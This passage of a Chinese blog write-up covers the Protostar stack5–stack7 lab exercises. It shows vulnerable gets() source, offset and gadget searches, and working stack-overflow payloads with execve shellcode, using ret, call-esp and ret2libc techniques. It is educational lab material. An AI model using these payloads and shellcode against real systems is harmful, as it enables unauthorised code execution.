0x41414141</span><br><span class="line">0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0xbffffca0:	0x41414141	0xbffffd00	0xbffffd4c	0xb7fe1848</span><br><span class="line">0xbffffcb0:	0xbffffd00	0xffffffff	0xb7ffeff4	0x08048232</span><br><span class="line">0xbffffcc0:	0x00000001	0xbffffd00</span><br></pre></td></tr></table></figure>

<p>感觉这系统有点问题，没有任何返回，如果exit，就退出了，而不是返回上一层shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\x90&quot; * 0x4c + &quot;\x90\xfc\xff\xbf&quot; + &quot;\x33\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8b\xdc\xb0\x0b\xcd\x80&quot;&apos; | ./stack5</span><br><span class="line"></span><br><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\x90&quot; * 0x4c + &quot;\x90\xfc\xff\xbf&quot; + &quot;\x33\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8b\xdc\xb0\x0b\xcd\x80&quot;&apos; | ./stack5</span><br><span class="line"></span><br><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\x90&quot; * 0x4c + &quot;\x90\xfc\xff\xbf&quot; + &quot;\x33\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8b\xdc\xb0\x0b\xcd\x80&quot;&apos; | ./stack5</span><br></pre></td></tr></table></figure>

<p>后来直接用exec(ls)的shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">giantbranch:~# msfvenom -p linux/x86/exec CMD=&quot;ls&quot; -f python </span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">No Arch selected, selecting Arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 38 bytes</span><br><span class="line">Final size of python file: 192 bytes</span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;</span><br><span class="line">buf += &quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03&quot;</span><br><span class="line">buf += &quot;\x00\x00\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80&quot;</span><br></pre></td></tr></table></figure>

<p>那么就可以执行ls的了，真是日了狗，应该是我第一次的shellcode错了（当时是学习一步一步学rop时候的shellcode，怎么会错了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\x90&quot; * 0x4c + &quot;\x10\xfd\xff\xbf&quot; + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80&quot;&apos; | ./stack5</span><br><span class="line">final0	final2	 format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7</span><br><span class="line">final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6</span><br><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\x90&quot; * 0x4c + &quot;\x10\xfd\xff\xbf&quot; + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80&quot;&apos; | ./stack5</span><br><span class="line">final0	final2	 format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7</span><br><span class="line">final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6</span><br></pre></td></tr></table></figure>

<h1 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void getpath()</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[64];</span><br><span class="line">  unsigned int ret;</span><br><span class="line"></span><br><span class="line">  printf(&quot;input path please: &quot;); fflush(stdout);</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(0);</span><br><span class="line"></span><br><span class="line">  if((ret &amp; 0xbf000000) == 0xbf000000) &#123;</span><br><span class="line">      printf(&quot;bzzzt (%p)\n&quot;, ret);</span><br><span class="line">      _exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;got path %s\n&quot;, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  getpath();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>if((ret &amp; 0xbf000000) == 0xbf000000)</code>，如果返回地址是以bf开头，那么就会退出，所以我们要讲返回地址改成其他地址，比如程序中或者libc库中的地址</p>
<p>先定位返回值，懒得gdb调试定位了，直接peda（如果当前虚拟机用不了peda，可以用别的虚拟机啊）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 150</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</span><br></pre></td></tr></table></figure>

<p>看看那里崩溃了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/stack6 </span><br><span class="line">input path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">got path AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x41414a41 in ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>查偏移为80</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_offset 0x41414a41 </span><br><span class="line">1094797889 found at offset: 80</span><br></pre></td></tr></table></figure>

<h2 id="覆盖返回地址为ret指令地址"><a href="#覆盖返回地址为ret指令地址" class="headerlink" title="覆盖返回地址为ret指令地址"></a>覆盖返回地址为ret指令地址</h2><p>将返回地址覆盖为ret指令，下一个dword就可以0xbf开头了</p>
<p>随便在下面找ret的地址就好</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# objdump -d ./stack6</span><br><span class="line"></span><br><span class="line">./stack6:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">08048330 &lt;_init&gt;:</span><br><span class="line"> 8048330:	55                   	push   %ebp</span><br><span class="line"> 8048331:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048333:	53                   	push   %ebx</span><br><span class="line"> 8048334:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 8048337:	e8 00 00 00 00       	call   804833c &lt;_init+0xc&gt;</span><br><span class="line"> 804833c:	5b                   	pop    %ebx</span><br><span class="line"> 804833d:	81 c3 b0 13 00 00    	add    $0x13b0,%ebx</span><br><span class="line"> 8048343:	8b 93 fc ff ff ff    	mov    -0x4(%ebx),%edx</span><br><span class="line"> 8048349:	85 d2                	test   %edx,%edx</span><br><span class="line"> 804834b:	74 05                	je     8048352 &lt;_init+0x22&gt;</span><br><span class="line"> 804834d:	e8 1e 00 00 00       	call   8048370 &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 8048352:	e8 09 01 00 00       	call   8048460 &lt;frame_dummy&gt;</span><br><span class="line"> 8048357:	e8 24 02 00 00       	call   8048580 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 804835c:	58                   	pop    %eax</span><br><span class="line"> 804835d:	5b                   	pop    %ebx</span><br><span class="line"> 804835e:	c9                   	leave  </span><br><span class="line"> 804835f:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048360 &lt;__gmon_start__@plt-0x10&gt;:</span><br><span class="line"> 8048360:	ff 35 f0 96 04 08    	pushl  0x80496f0</span><br><span class="line"> 8048366:	ff 25 f4 96 04 08    	jmp    *0x80496f4</span><br><span class="line"> 804836c:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p>我选这个吧:<code>804835f</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;A&quot; * 80 + &quot;\x5f\x83\x04\x08&quot; + &quot;\xe4\xfc\xff\xbf&quot; + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80&quot;&apos; | ./stack6</span><br><span class="line">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA彿¿j</span><br><span class="line">                                                                                                            XRfh-c榯sh</span><br><span class="line">1.txt	final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6</span><br><span class="line">final0	final2	format1  format3  heap0    heap2  net0	 net2  net4  stack1  stack3  stack5  stack7</span><br></pre></td></tr></table></figure>

<h2 id="覆盖返回地址为jmp-esp"><a href="#覆盖返回地址为jmp-esp" class="headerlink" title="覆盖返回地址为jmp esp"></a>覆盖返回地址为jmp esp</h2><p>这个应该是比较最为通用方便的了</p>
<p>由于在当前程序找不到，我们去libc找吧<br>看看使用的库在哪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# ldd ./stack6</span><br><span class="line">	linux-gate.so.1 =&gt;  (0xb7fe4000)</span><br><span class="line">	libc.so.6 =&gt; /lib/libc.so.6 (0xb7e99000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xb7fe5000)</span><br></pre></td></tr></table></figure>

<p>用rp查找一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# ./rp-lin-x86 -f /lib/libc.so.6 --rop=2 | grep &quot;call esp&quot;</span><br><span class="line">0x00117fc0: aam 0x74 ; out dx, al ; call esp ;  (1 found)</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">0x001288a8: add dh, dh ; call esp ;  (1 found)</span><br><span class="line">0x001288a9: add dh, dh ; call esp ;  (1 found)</span><br><span class="line">0x00129f18: bound ecx, dword [ebp] ; sti  ; call esp ;  (1 found)</span><br><span class="line">0x00002e63: call esp ;  (1 found)</span><br><span class="line">0x00083a4b: call esp ;  (1 found)</span><br><span class="line">0x00110af8: call esp ;  (1 found)</span><br><span class="line">0x00117fc3: call esp ;  (1 found)</span><br><span class="line">0x0011a12a: call esp ;  (1 found)</span><br><span class="line">0x0011a12b: call esp ;  (1 found)</span><br><span class="line">0x0011b17e: call esp ;  (1 found)</span><br><span class="line">0x0011b17f: call esp ;  (1 found)</span><br><span class="line">0x0011b19a: call esp ;  (1 found)</span><br><span class="line">0x0011b19b: call esp ;  (1 found)</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>选这个吧<code>0x00110af8</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0xb7e99000 + 0x00110af8)</span><br><span class="line">&apos;0xb7fa9af8L&apos;</span><br></pre></td></tr></table></figure>

<p>但发现这是错的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /4i 0xb7fa9af8L</span><br><span class="line">0xb7fa9af8 &lt;translit_to_idx+4504&gt;:	adc    $0x18000010,%eax</span><br><span class="line">0xb7fa9afd &lt;translit_to_idx+4509&gt;:	adc    %al,(%eax)</span><br><span class="line">0xb7fa9aff &lt;translit_to_idx+4511&gt;:	add    %bl,(%ebx)</span><br><span class="line">0xb7fa9b01 &lt;translit_to_idx+4513&gt;:	adc    %al,(%eax)</span><br></pre></td></tr></table></figure>

<p>后来直接看maps</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/home/user# cat /proc/5087/maps </span><br><span class="line">08048000-0804e000 r-xp 00000000 00:10 260        /bin/sleep</span><br><span class="line">0804e000-0804f000 rw-p 00005000 00:10 260        /bin/sleep</span><br><span class="line">0804f000-08070000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e96000-b7e97000 rw-p 00000000 00:00 0 </span><br><span class="line">b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so</span><br><span class="line">b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so</span><br><span class="line">b7fd6000-b7fd8000 r--p 0013e000 00:10 759        /lib/libc-2.11.2.so</span><br><span class="line">b7fd8000-b7fd9000 rw-p 00140000 00:10 759        /lib/libc-</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">bffeb000-c0000000 rw-p 00000000 00:00 0          [stack]</span><br></pre></td></tr></table></figure>

<p>那就需要减个0x2000了，这时候就对了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /4i 0xb7fa7af8</span><br><span class="line">0xb7fa7af8 &lt;translit_from_tbl+7160&gt;:	call   *%esp</span><br><span class="line">0xb7fa7afa &lt;translit_from_tbl+7162&gt;:	add    %eax,(%eax)</span><br><span class="line">0xb7fa7afc &lt;translit_from_tbl+7164&gt;:	add    %al,(%eax)</span><br><span class="line">0xb7fa7afe &lt;translit_from_tbl+7166&gt;:	add    %al,(%eax)</span><br></pre></td></tr></table></figure>

<p>那么就可以了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;A&quot; * 80 + &quot;\xf8\x7a\xfa\xb7&quot; + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80&quot;&apos; | ./stack6</span><br><span class="line">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA󺶁AAAAAAAAAAA󺶪</span><br><span class="line">                                                                                                         XRfh-c榯sh</span><br><span class="line">1.txt	final1	format0  format2  format4  heap1  heap3  net1  net3  rp-lin-x86  stack1  stack3  stack5  stack7</span><br><span class="line">final0	final2	format1  format3  heap0    heap2  net0	 net2  net4  stack0	 stack2  stack4  stack6</span><br></pre></td></tr></table></figure>

<h2 id="其他方法呢"><a href="#其他方法呢" class="headerlink" title="其他方法呢"></a>其他方法呢</h2><p>当然还有其他方法啦，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 80 + p32(system_addr) + p32(ret) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>

<p>当然binsh_addr懒得找的话也可以直接放栈上，反正没开随机化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 80 + p32(system_addr) + p32(ret) + p32(binsh_addr) + &quot;binsh&quot;</span><br></pre></td></tr></table></figure>

<p>rop很神奇，很多思路的</p>
<h1 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h1><p>代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char *getpath()</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[64];</span><br><span class="line">  unsigned int ret;</span><br><span class="line"></span><br><span class="line">  printf(&quot;input path please: &quot;); fflush(stdout);</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(0);</span><br><span class="line"></span><br><span class="line">  if((ret &amp; 0xb0000000) == 0xb0000000) &#123;</span><br><span class="line">      printf(&quot;bzzzt (%p)\n&quot;, ret);</span><br><span class="line">      _exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;got path %s\n&quot;, buffer);</span><br><span class="line">  return strdup(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  getpath();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这次连b开头的地址都不能覆盖</p>
<p>那么我暂时的想法是覆盖为程序段的地址，比如程序段的ret，就有很多，跟上次stack6一样的了，所以有时候做一题就可以了，不用做太多，就这个道理</p>
<p>因为你看内存就只有程序的地址不是b开头的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/home/user# cat /proc/5199/maps </span><br><span class="line">08048000-08049000 r-xp 00000000 00:10 4521       /opt/protostar/bin/stack7</span><br><span class="line">08049000-0804a000 rwxp 00000000 00:10 4521       /opt/protostar/bin/stack7</span><br><span class="line">b7e96000-b7e97000 rwxp 00000000 00:00 0 </span><br><span class="line">b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so</span><br><span class="line">b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so</span><br><span class="line">b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so</span><br><span class="line">b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so</span><br><span class="line">b7fd9000-b7fdc000 rwxp 00000000 00:00 0 </span><br><span class="line">b7fde000-b7fe2000 rwxp 00000000 00:00 0 </span><br><span class="line">b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]</span><br><span class="line">b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so</span><br><span class="line">b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so</span><br><span class="line">b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so</span><br><span class="line">bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]</span><br></pre></td></tr></table></figure>

<p>所以最终</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:/opt/protostar/bin# python -c &apos;print &quot;A&quot; * 80 + &quot;\x83\x83\x04\x08&quot; + &quot;\xe4\xfc\xff\xbf&quot; + &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80&quot;&apos; | ./stack6</span><br><span class="line">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA彿¿j</span><br><span class="line">                                                                                                          XRfh-c榯sh</span><br><span class="line">1.txt	final1	format0  format2  format4  heap1  heap3  net1  net3  rp-lin-x86  stack1  stack3  stack5  stack7</span><br><span class="line">final0	final2	format1  format3  heap0    heap2  net0	 net2  net4  stack0	 stack2  stack4  stack6</span><br></pre></td></tr></table></figure>

<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>发现一条快捷搜索的命令</p>
<p><code>objdump -M intel -d /opt/protostar/bin/stack7 | grep &quot;call.*eax&quot;</code></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>自愿打赏专区</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    
    
      <div class="footer-custom">
        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
      </div>
    

    
    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
    </div>
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    giantbranch
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://www.giantbranch.cn/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/" title="Exploit Exercises Protostar Stack Part 0-7">https://www.giantbranch.cn/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Exploit-Exercises-Protostar-Stack/" rel="tag"># Exploit Exercises Protostar,Stack</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/05/20/我的安全之路——二进制与逆向篇/" rel="next" title="我的安全之路——二进制与逆向篇">
                <i class="fa fa-chevron-left"></i> 我的安全之路——二进制与逆向篇
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/08/19/当gflag不“奏效”——CVE-2013-0077 Microsoft DirectShow quartz.dll m2p文件堆溢出漏洞/" rel="prev" title="当gflag不“奏效”——CVE-2013-0077 Microsoft DirectShow quartz.dll m2p文件堆溢出漏洞">
                当gflag不“奏效”——CVE-2013-0077 Microsoft DirectShow quartz.dll m2p文件堆溢出漏洞 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
        
  <div class="bdsharebuttonbox">
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
    <a href="#" class="bds_more" data-cmd="more"></a>
